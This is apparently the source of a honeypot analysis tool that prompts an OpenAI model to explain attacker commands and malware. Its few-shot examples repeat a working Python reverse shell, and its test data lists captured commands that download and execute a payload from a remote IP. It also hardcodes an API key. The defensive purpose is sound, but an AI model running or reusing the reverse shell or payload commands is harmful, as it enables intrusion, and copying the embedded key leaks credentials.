from analyzerbase import *

import ast
from openai import OpenAI, OpenAIError
OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY') or "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"

class OpenAIAnalyzer:
    
    def __init__(self, api_key=OPENAI_API_KEY, model="gpt-4-1106-preview", db_path="tests/aidb") -> None:
        self.client = OpenAI(api_key=OPENAI_API_KEY)
        self.model = model
        self.db_path = Path(db_path)
        if not self.db_path.exists():
            self.db_path.mkdir(exist_ok=True, parents=True)



    def get_message_hash(self, messages):
        return hashlib.sha256(str(messages).encode()).hexdigest()



    def try_openai(self, getter_fn, parser_fn, **kwargs):
        try:
            response = getter_fn(**kwargs)
            return parser_fn(response)
        except Exception as e:
            if isinstance(e, (OpenAIError)):
                print(e)
                return f'OpenAI Error: {e}'
            else:
                print(e)
                return str(e)    



    def try_load_json_result(self, result, calling_fn, retries, n, *args, **kwargs):
        try:
            return json.loads(result)
        except Exception as e1:
            try:
                return ast.literal_eval(result)
            except Exception as e2:
                print(f"ERRORS {e1} {e2} {result}. Trying again {retries} more times")
                if retries > 0:
                    return calling_fn(*args, n=n, retries=retries - 1, **kwargs)
                else:
                    return f"ERRORS {e1} {e2} {result}"

    

    def openai_get_chat(self, messages=[], n=1, **kwargs):
        message_hash = self.get_message_hash(messages)
        db_file = self.db_path / f"{message_hash}.json"
        
        if db_file.exists():
            print(f"Reading {message_hash} from db")
            with open(db_file) as f:
                result = json.load(f)["result"]
        else:
            print(f"Getting OpenAI resp for message_hash {message_hash}")
            result = self.try_openai(
                getter_fn=self.client.chat.completions.create, 
                parser_fn=lambda response: response.choices[0].message.content.strip(),
                messages=messages, 
                n=n,
                **kwargs)

            with open(db_file, "w+") as f:
                json.dump({"messages": messages, "kwargs": kwargs, "result": result}, f, indent=2)

        return result



    def format_commands(self, commands):
        #return json.dumps({ str(n) : cmd for n, cmd in enumerate(commands)}, indent=0 )
        return { str(n) : cmd for n, cmd in enumerate(commands) }
    
    

    def explain_commands(self, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain a series commands that were executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object in the following format: {command_index: command_string, ...}.",
        "Output must be a json object with string keys that correspond to command indicies or command ranges, and string values that explain the corresponding command(s).",
        "Output must be in the following format {command_index: explanation_string, ...}."
        "The explanation_string values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        "You should group adjcent commands into logical groups and explain what the attacker was trying to do with each command.",
        ])
        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
                             "cd /usr/bin;chmod +x example.sh", 
                             "./example.sh >> example_output.py", 
                             "exec example_output.py || python3 example_output.py &",
                             "ps -ajfx | grep example_output.py", 
                             "rm example.sh",  "rm example_output.py", "exit"]
        #example_commands1 = self.format_commands(commands)

        example_response1 = {
            "0":"The attacker uses `wget` to **download a shell script** from `http://example.com` saving it as `/usr/bin/example.sh`",
            "1":"The attacker then **changes directories** to `/usr/bin` and makes the script **executable** with `chmod +x example.sh`",
            "2":"The attacker then executes the script with `./example.sh` and **appends the output of the shell script to a new python file named `example_output.py`**",
            "3":"The attacker then **executes the generated python script** `example_output.py` through the `exec` command or in the background`python3 example_output.py &`",
            "4":"The attacker then **lists all processes** and **filters the output** for `example_output.py` with `ps -ajfx | grep example_output.py`",
            "5-6":"The attacker then **removes the shell script** `example.sh` and the python script `example_output.py` with `rm example.sh` and `rm example_output.py`",
            "7":"Finally, the attacker **exits the terminal** with `exit`",
        }

        # example_commands2 = ["cd / && ls -l", "cat /etc/passwd | nc 20.7.1.69 420", "./example.sh >> example_output.py", "e cho 'This command is an error'", "exec example_output.py",]
        # #example_response2 = ['The attacker **changes directories** to the root directory `/` and executes `ls -l` to **list all files and directories**, including their permissions and ownership', 'Then, `cat /etc/passwd` is executed which **displays the content of the `/etc/passwd` file** (which contains user account information) and that content is sent to an external IP address `20.7.1.69` on port `420` using `nc` (netcat), possibly indicating **information leakage** or **data exfiltration**', 'After which, the attacker executes the script `./example.sh` which implies an earlier downloaded or written script is run (possible malicious actions depending on the content of the script)', "Finally, the command `e cho 'This command is an error'` is executed, but this command is flawed. It appears the attacker meant to run an `echo` command but made a typo. However, this could also be an attempt to **create confusion or misdirection** during a forensic analysis of the system."]
        # example_response3 = ['The attacker initially **changes to the root directory** and lists all files and directories with `cd / && ls -l`', 'The attacker then **reads the contents of /etc/passwd**, which contains user account information and sends it to **remote server with IP 20.7.1.69 on port 420** using `netcat (nc)`', 'Next, **appends the output of the executed `example.sh` script to a new python file named `example_output.py`**', 'Attempted to execute **an incorrectly syntaxed echo command**, presumably attempting to add a line of text to the terminal and failing due it being incorrectly formatted', 'Finally, the attacker attempts to **execute the generated python script** `example_output.py` through the `exec` command']

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": json.dumps(self.format_commands(example_commands1), indent=0)},
            {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
            #{"role": "user", "content": self.format_commands(example_commands2)},
            #{"role": "assistant", "content": str(example_response2)}
            {"role": "user", "content": json.dumps(self.format_commands(commands), indent=0)}
        ]


        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)

        

        result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
        if isinstance(result, str):
            return result
        else:
            return self.zip_command_explanations(commands, result)



    def zip_command_explanations(self, commands, result):
        if isinstance(result, list):
            if len(result) == len(commands):
                return dict(zip(commands, result))
            else:
                return dict(zip(commands, result + [""] * (len(commands) - len(result))))
        
        if isinstance(result, dict):
            keys = list(result.keys())

            if len(keys) == len(commands):
                result = [k + v for k,v in result.items()]
                return dict(zip(commands, result))
            
            if all([isinstance(k, int) for k in keys]):  
                return {commands[i]: result.get(i) for i in range(len(commands))}
            
            valid_range_keys = re.compile(r"(\d+)\-?(\d*)")
            key_matches = { k : valid_range_keys.match(k) for k in keys }
            
            if all(key_matches):
                grouped_commands = []
                for k in keys:
                    start, end = key_matches[k].groups()
                    if end == "":
                        i = int(start)
                        grouped_commands.append(commands[i])
                    else:
                        start, end = int(start), int(end)
                        grouped_commands.append("\n".join(commands[start:end]))
                

                return dict(zip(grouped_commands, result.values()))

            elif all([isinstance(k, str) for k in keys]):
                return dict(zip(commands, result.values()))







    def explain_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with two keys: malware_explanation, malware_language",
        "Output must be in the following format {malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}.",
        "The malware_explanation should explain the malware source code in detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])

        example_commands1 = ["wget http://example.com -O example.py", 
                            "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
                            "rm example.py"]

        example_malware1 = """
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    pty.spawn(args.shell)
"""

    
        example_explanation1 = """This malware sample is a `Python` script that is used to spawn a shell on a remote system. 
The script uses the `socket`, `os`, `argparse`, and `pty` modules.
* The `socket` module is used to create a socket object that is used to connect to the remote system.
* The `os` module is used to duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
* The `argparse` module is used to parse the command line arguments.
* The `pty` module is used to spawn a shell on the remote system.

The script performs the following steps:
1. Initialize the parser object and parse the command line arguments.
2. Create a socket object using the specified socket family, type, protocol, and file descriptor.
3. Connect to the remote system using the specified IP address and port.
4. Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
5. Spawn a shell on the remote system.

Since the script was executed with the following command: `python3 example.py -l 100.100.101.101 -p 4444 &` we know the script was run in the background and attempted to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
We also know that the script attempted to spawn a `/bin/bash` shell on the remote system since this is the default value for the `--shell` argument. 
"""


        example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
        example_response1 = {"malware_explanation": example_explanation1, "malware_language": "python"}

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": json.dumps(example_input1, indent=0)},
            {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
            {"role": "user", "content": json.dumps({"malware_source_code": malware_source_code, "commands": self.format_commands(commands)}, indent=0)}
        ]

        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)


        result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
        return result
    

    def comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to add detailed comments to a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        # "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        # "malware_source_code will be a string containing the source code of the malware that you are to add comments to.",
        "Input will be structured in the following format: {malware_source_code: {line_number_in_source_code: malware_source_code_line_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a json object containing each line of the source code of the malware that you are to add comments to.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with keys that correspond to line numbers in the malware_source_code and values that are the comments for that line.",
        "Comments should explain what the attacker was trying to do with each important line of the malware_source_code.",
        "Comments will be inserted in the malware source code so make sure to use the correct syntax for the language the malware is written in and indent your comments correctly.",
        ])

        example_commands = ["wget http://example.com -O example.py", 
                            "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
                            "rm example.py"]

        example_malware = """import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    pty.spawn(args.shell)
"""

        commented_malware = """# This script is a python script that is used to spawn a shell on a remote system.
# Import the socket, os, argparse, and pty modules.
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    # Initialize the parser object.
    parser=argparse.ArgumentParser()

    # The shell argument is used to specify the shell to spawn on the remote system.
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    
    # The host argument is used to specify the IP address of the remote system.
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')

    # The port argument is used to specify the port to connect to on the remote system. 
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    # The family argument is used to specify the socket family to use. The default is AF_INET.
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")

    # The type argument is used to specify the socket type to use. The default is SOCK_STREAM.
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")

    # The protocol argument is used to specify the socket protocol to use. The default is -1.
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")

    # The fileno argument is used to specify the file descriptor to use. The default is None.
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    # Parse the arguments.
    args=parser.parse_args()

    # Create a socket object using the specified socket family, type, protocol, and file descriptor.
    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)

    # Connect to the remote system using the specified IP address and port.
    s.connect((args.host, args.port))

    # Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    # Spawn a shell on the remote system.
    pty.spawn(args.shell)
"""

        

        
        
        #example_response = commented_malware
        example_response = {}
        commented_malware_lines = commented_malware.split("\n")
        example_malware_lines = example_malware.split("\n")

        example_malware_lines_input = { str(n+1) : line for n, line in enumerate(example_malware_lines)}
        example_input = {"malware_source_code": example_malware_lines_input, "commands": self.format_commands(example_commands)}
        
        comment = ""
        for line in commented_malware_lines:
            if line.strip().startswith("#"):
                comment += line + "\n"
            elif comment:
                example_malware_lines_index = example_malware_lines.index(line)
                example_response[example_malware_lines_index+1] = comment
                comment = ""

        
        
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": json.dumps(example_input, indent=0)},
            {"role": "assistant", "content": json.dumps(example_response, indent=0)},
            {"role": "user", "content": json.dumps({"malware_source_code": malware_source_code, "commands": self.format_commands(commands)}, indent=0)}
        ]

        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)


        result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
        result = self.insert_comments(malware_source_code, result)
        return result
    

    def insert_comments(self, source_code, comment_indexes):
        lines = source_code.split("\n")
        for line_index, comment in comment_indexes.items():
            line_index = int(line_index)
            lines[line_index] = comment + "\n" + lines[line_index]

        return "\n".join(lines)





    def explain_and_comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain and comment a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain and comment.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with three keys: commented_code, malware_explanation, malware_language",
        "Output must be in the following format {commented_code: malware_source_code_with_comments_explaining_steps, malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}."
        #"The commented_code value should be the same as the input source code but with comments explaining each step of the malware execution.",
        "The commented_code value must contain every line of the input source code but with comments explaining each step of the malware execution.",
        "The malware_explanation should explain the code and comments in the commented_code value in greater detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])

        example_commands1 = ["wget http://example.com -O example.py", 
                            "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
                            "rm example.py"]

        example_malware1 = """
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    pty.spawn(args.shell)
"""

        commented_malware1 = """

# This script is a python script that is used to spawn a shell on a remote system.

# Import the socket, os, argparse, and pty modules.
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    # Initialize the parser object.
    parser=argparse.ArgumentParser()

    # The shell argument is used to specify the shell to spawn on the remote system.
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    
    # The host argument is used to specify the IP address of the remote system.
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')

    # The port argument is used to specify the port to connect to on the remote system. 
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    # The family argument is used to specify the socket family to use. The default is AF_INET.
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")

    # The type argument is used to specify the socket type to use. The default is SOCK_STREAM.
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")

    # The protocol argument is used to specify the socket protocol to use. The default is -1.
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")

    # The fileno argument is used to specify the file descriptor to use. The default is None.
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    # Parse the arguments.
    args=parser.parse_args()

    # Create a socket object using the specified socket family, type, protocol, and file descriptor.
    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)

    # Connect to the remote system using the specified IP address and port.
    s.connect((args.host, args.port))

    # Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    # Spawn a shell on the remote system.
    pty.spawn(args.shell)
"""

        example_explanation1 = """This malware sample is a `Python` script that is used to spawn a shell on a remote system. 
The script uses the `socket`, `os`, `argparse`, and `pty` modules.
* The `socket` module is used to create a socket object that is used to connect to the remote system.
* The `os` module is used to duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
* The `argparse` module is used to parse the command line arguments.
* The `pty` module is used to spawn a shell on the remote system.

The script performs the following steps:
1. Initialize the parser object and parse the command line arguments.
2. Create a socket object using the specified socket family, type, protocol, and file descriptor.
3. Connect to the remote system using the specified IP address and port.
4. Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
5. Spawn a shell on the remote system.

Since the script was executed with the following command: `python3 example.py -l 100.100.101.101 -p 4444 &` we know the script was run in the background and attempted to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
We also know that the script attempted to spawn a `/bin/bash` shell on the remote system since this is the default value for the `--shell` argument. 
"""


        example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
        example_response1 = {"commented_code": commented_malware1, "malware_explanation": example_explanation1, "malware_language": "python"}

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": json.dumps(example_input1, indent=0)},
            {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
            {"role": "user", "content": json.dumps({"malware_source_code": malware_source_code, "commands": self.format_commands(commands)}, indent=0)}
        ]

        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)


        result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
        return result


    def answer_attack_questions(self, questions: list, commands=[], malware_source_code=None, n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to answer questions about an that was recorded on a Linux honeypot system.",
        "Input will be provided as a json object with three keys: commands and malware_source_code.",
        "Input will be structured in the following format: {questions: {question_index: question_string, ...}, commands: {command_index: command_string, ...}, malware_source_code: malware_source_code_string}.",
        "questions are the questions that you are to answer about the attack.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "malware_source_code is the source code of the malware that was executed by the attacker and can be an empty string if no malware was downloaded or executed by the attacker.",
        "Output must be a json object with one key per question and values that are the answers to the questions with the corresponding question_index.",
        "Output must be in the following format {answer_index: paragraph(s) explaining answer to question at question_index, ...}.",
        "The answer values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])

        example_commands1 = ["wget http://example.com -O example.py", 
                            "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
                            "rm example.py"]


        example_malware1 = """
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    pty.spawn(args.shell)
"""


        example_questions1 ={"What is the goal of this attack?" : """The goal of this attack was to **spawn a shell on the remote system** so the attacker could gain access to the system and perform further actions.
This is evident by the fact that the script redirects the file descriptors for `stdin`, `stdout`, and `stderr` to the socket file descriptor and attempts to spawn a shell on the remote system using the `pty` module .
The attacker ran the malware script with the arguments `-l 100.100.101.101 -p 4444` which means the attacker was trying to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
If the attacker was successful in spawning a shell on the remote system they would be able to execute commands on the remote system and gain access to the system.
The attacker could then use the shell to perform further actions such as downloading and executing additional malware on the system and using the system to attack other systems on the network."""}

        example_input1 = {"questions": self.format_commands(example_questions1.keys()), "malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
        example_response1 = self.format_commands(example_questions1.values())

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": json.dumps(example_input1, indent=0)},
            {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
            {"role": "user", "content": json.dumps({"questions": self.format_commands(questions), "commands": self.format_commands(commands), "malware_source_code": malware_source_code}, indent=0)}
        ]

        result = self.openai_get_chat(
            model=self.model,
            messages=messages, 
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)


        result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
        result = self.zip_question_answers(questions, result)
        return result
        
    def zip_question_answers(self,questions,result):
        return dict(zip(questions, result.values()))



def test_explain_commands(analyzer):
    cmds = ['echo 1 && cat /bin/echo', 
            'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 
            'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', 
            "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 
            'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 